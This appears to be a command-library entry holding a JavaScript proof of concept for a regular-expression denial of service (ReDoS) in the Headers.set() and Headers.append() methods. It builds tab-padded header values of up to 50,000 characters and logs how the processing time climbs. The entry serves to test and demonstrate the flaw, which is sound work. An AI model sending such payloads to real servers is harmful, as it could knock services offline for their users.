---
data: >-
  console.log("Headers.set()"); for(let i =0; i <=5; i++){ const headers =new
  Headers(); const attack ="a"+"\t".repeat(i *10_000)+"\ta"; const start =
  performance.now();  headers.set("foo", attack); 
  console.log(`${attack.length}: ${performance.now()- start}ms`); }
  console.log("\nHeaders.append()"); for(let i =0; i <=5; i++){ const headers
  =new Headers(); const attack ="a"+"\t".repeat(i *10_000)+"\ta"; const start =
  performance.now();  headers.append("foo", attack); 
  console.log(`${attack.length}: ${performance.now()- start}ms`); }
tags:
  - test
  - scaling
  - dos
type: command
executor: javascript
platforms:
  - Node.js
  - JavaScript
id: fcf9375e-bbbc-4782-acac-2b0fce88c2f1
created_at: '2025-12-14T17:26:36.575Z'
updated_at: '2025-12-14T17:26:36.575Z'
verified: false
validated: true
submitted: true
---
# scaled-redos-test-js

## Command

```javascript
console.log("Headers.set()");
for(let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.set("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
console.log("\nHeaders.append()");
for(let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.append("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
```

## Description

Runs looped tests on Headers.set() and append() with scaling tab repetitions (0-50,000), logging lengths and times to show ReDoS escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| i * 10_000 | Scales repetitions from 0 to 50,000 in 10k steps | Yes |
| set/append("foo", attack) | Triggers normalization for each iteration | Yes |

## Examples

### Basic Usage

```javascript
// As above, full loop
```

### Advanced Usage

Modify loop limit for finer granularity:
```javascript
for(let i = 0; i <= 10; i++) { ... repeat(i * 5_000) ... }
```

## Expected Output

Output like 'Headers.set()\n3: 0.4768ms\n...\n50003: 2645.8285ms\n\nHeaders.append()\n...' with increasing delays.

## Related

- [[Related Procedure: Measure-and-Scale-DoS-Impact]]
